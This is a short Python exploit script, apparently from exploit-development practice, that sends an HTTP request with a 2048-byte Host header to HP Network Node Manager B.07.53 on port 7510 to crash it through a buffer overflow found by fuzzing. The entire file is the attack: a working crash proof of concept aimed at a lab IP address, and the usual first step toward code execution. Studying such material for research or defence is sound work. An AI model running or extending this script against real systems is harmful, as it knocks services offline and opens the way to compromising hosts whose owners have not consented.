#!/usr/bin/python

# file name: hpnnm-B.07.53-exploit-v1.py
# author: greyshell
# description: crash with buffer length = 2048 (identified during fuzzing)

import socket
import os
import sys 

# original crash buff length = 2048
buff = 2048 * "A"
crash = buff

buffer = "GET /topology/homeBaseView HTTP/1.1\r\n"
buffer += "Host: " + crash + "\r\n"
buffer += "Content-Type: application/x-www-form-urlencoded\r\n" 
buffer += "User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03\r\n"
buffer += "Content-Length: 1048580\r\n\r\n" 
print "[*] Sending evil HTTP request to HP NNM -B.07.53, buffer length: ", len(buff)
expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("172.16.232.178", 7510))
expl.send(buffer)
expl.close()
